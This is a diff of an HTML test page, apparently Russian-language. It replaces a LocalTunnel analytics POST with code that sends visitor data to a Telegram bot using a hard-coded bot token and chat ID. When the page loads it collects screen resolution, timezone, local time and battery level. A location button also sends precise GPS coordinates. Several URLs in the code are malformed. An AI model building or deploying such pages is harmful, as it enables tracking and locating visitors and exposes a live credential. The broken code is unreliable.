@@ -29,74 +29,69 @@
 <body>
 
     <h1>Добро пожаловать на тестовую страницу</h1>
-    <p>Этот сайт автоматически отправляет технические параметры сессии на ваш server для аналитики.</p>
+    <p>Этот сайт автоматически отправляет технические параметры сессии в Telegram-бот.</p>
     
-    <!-- Кнопка для опционального запроса точных координат -->
     <button onclick="requestLocation()">Разрешить геолокацию</button>
 
     <script>
-        // Главная функция сбора и отправки данных
-        async function collectAnalytics(extraData = {}) {
+        // Ваши личные данные для отправки в Telegram
+        const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
+        const TG_CHAT_ID = "6559747526"; 
+
+        async function sendToTelegram(text) {
+            const url = `https://telegram.org{TG_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(e => console.error(e));
+        }
+
+        async function collectAnalytics(extraText = "") {
             let batteryLevel = "Не поддерживается";
-            
-            // Проверяем, поддерживает ли браузер Battery API
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
                     batteryLevel = `${Math.round(battery.level * 100)}%`;
-                } catch (e) {
-                    batteryLevel = "Ошибка доступа";
-                }
+                } catch (e) {}
             }
 
-            // Формируем пакет данных от JavaScript
-            const payload = {
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                windowSize: `${window.innerWidth}x${window.innerHeight}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                localTime: new Date().toLocaleTimeString(),
-                battery: batteryLevel,
-                ...extraData // Если передана геолокация, она добавится сюда
-            };
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const localTime = new Date().toLocaleTimeString();
 
-            // Отправляем JSON-данные через интернет-туннель LocalTunnel
-            fetch('https://loca.lt', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Ответ сервера:', data))
-            .catch(err => console.error('Не удалось отправить данные на сервер:', err));
+            const message = `🔔 *Новый посетитель!*\n\n` +
+                            `🖥 Экран: ${screenRes}\n` +
+                            `🌍 Зона: ${timezone}\n` +
+                            `🕒 Время: ${localTime}\n` +
+                            `🔋 Батарея: ${batteryLevel}` + 
+                            extraText;
+
+            sendToTelegram(message);
         }
 
-        // Автоматический запуск сбора базовых данных сразу после загрузки страницы
         window.addEventListener('DOMContentLoaded', () => {
             collectAnalytics();
         });
 
-        // Функция, которая сработает только при нажатии на кнопку разрешения геопозиции
         function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const geoData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        // Отправляем данные повторно, но уже с точными координатами
-                        collectAnalytics(geoData);
-                        alert("Координаты успешно отправлены на сервер!");
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const geoText = `\n📍 *Геолокация*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Открыть на картах](https://google.com{lat},${lon})`;
+                        collectAnalytics(geoText);
+                        alert("Данные успешно обновлены!");
                     },
                     (error) => {
-                        console.log('Пользователь отклонил запрос геопозиции или произошла ошибка.');
                         alert("Доступ к геолокации отклонен.");
                     }
                 );
-            } else {
-                alert("Геопозиция не поддерживается вашим браузером.");
             }
         }
     </script>
